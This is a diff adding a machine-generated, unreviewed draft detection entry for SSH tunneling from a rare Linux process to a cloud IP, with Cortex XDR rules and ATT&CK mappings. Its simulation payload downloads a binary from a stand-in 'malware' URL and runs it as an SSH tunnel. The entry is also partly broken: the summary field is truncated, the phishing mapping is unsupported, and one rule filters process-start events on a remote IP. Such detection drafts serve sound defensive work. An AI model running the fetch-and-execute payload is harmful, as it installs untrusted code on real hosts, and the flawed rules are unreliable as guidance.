@@ -1,0 +1,190 @@
+{
+  "id": "TTP-0000-0313",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "SSH Tunneling to Cloud Resource via Rare Process",
+    "summary": "An attacker uses a rare process to establish an SSH tunnel to an uncommon cloud resource, potentially exfiltrating data or creating a backdoor. Cortex should detect the unusual process spawning SSH an",
+    "description": "An attacker uses a rare process to establish an SSH tunnel to an uncommon cloud resource, potentially exfiltrating data or creating a backdoor. Cortex should detect the unusual process spawning SSH and connecting to a cloud IP."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.004",
+        "name": "Remote Services: SSH",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "subtechnique_id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/ssh-tunnel\nwget -O /tmp/ssh-tunnel/ssh_client https://example.com/malware\nchmod +x /tmp/ssh-tunnel/ssh_client\n/tmp/ssh-tunnel/ssh_client -o StrictHostKeyChecking=no -f -N -L 8080:192.0.2.1:22 user@192.0.2.100\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "SSH client process started with unusual parameters",
+        "expected_value": "action_process_image_name = '/tmp/ssh-tunnel/ssh_client'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound SSH connection to cloud resource",
+        "expected_value": "action_remote_ip = '192.0.2.100' and dst_port = 22"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Rare Process SSH to Cloud Resource",
+        "description": "Detection of a rare or unknown process initiating an SSH session to a cloud IP address",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/sftp', '/usr/bin/scp')\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')",
+        "mitre_technique_ids": [
+          "T1059.004",
+          "T1021.004"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unusual SSH Process to Cloud IP",
+        "description": "Behavioral deviation where a process not typically used for SSH connects to a cloud IP address",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/sftp', '/usr/bin/scp')\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')\n| filter network_protocol = 'TCP' and dst_port = 22",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name",
+        "mitre_technique_ids": [
+          "T1059.004",
+          "T1021.004",
+          "T1566.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "SSH Tunneling to Cloud IPs",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.1')\n| filter network_protocol = 'TCP' and dst_port = 22\n| filter action_process_image_name not in ('/usr/bin/ssh', '/usr/bin/scp')\n| comp count() by action_process_image_name, action_remote_ip",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Rare process created an SSH session to an uncommon cloud resource; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/rare-process-created-an-ssh-session-to-an-uncommon-cloud-resource"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Rare process created an SSH session to an uncommon cloud resource",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/rare-process-created-an-ssh-session-to-an-uncommon-cloud-resource",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.004",
+      "url": "https://attack.mitre.org/techniques/T1059/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1021.004",
+      "url": "https://attack.mitre.org/techniques/T1021/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566.001",
+      "url": "https://attack.mitre.org/techniques/T1566/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
